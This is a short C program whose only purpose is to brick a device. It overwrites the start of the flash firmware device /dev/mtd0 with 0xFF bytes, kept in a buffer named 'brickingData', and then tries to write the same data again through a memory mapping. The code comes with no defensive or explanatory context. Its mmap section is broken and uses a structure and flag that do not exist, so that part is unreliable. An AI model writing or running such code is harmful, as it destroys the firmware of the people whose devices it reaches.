#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

int main() {
  FILE *firmware = fopen("/dev/mtd0", "w");
  char brickingData[1024] = {0};
  for (int i = 0; i < 1024; i++) {
      brickingData[i] = 0xFF;
  }
  fwrite(brickingData, sizeof(brickingData), 1, firmware);
  fclose(firmware);

  int fd = open("/dev/mtd0", O_RDWR);
  if (fd < 0) {
    perror("open");
    exit(EXIT_FAILURE);
  }

  struct mmap_arg arg = {
   .addr = NULL,
   .len = 1024,
   .access_perm = MAP_WRITE,
   .fd = fd,
   .flags = MAP_ANONYMOUS
  };

  int ret = mmap(NULL, 1024, MAP_WRITE, &arg);
  if (ret < 0) {
    perror("mmap");
    exit(EXIT_FAILURE);
  }

  // Write the bricking data to the mmap'ed region
  memset(brickingData, 0xFF, 1024);
  memcpy(mmap(NULL, 1024, MAP_WRITE, &arg), brickingData, 1024);

  munmap((void*)arg.addr, 1024);
  close(fd);
  return 0;
}
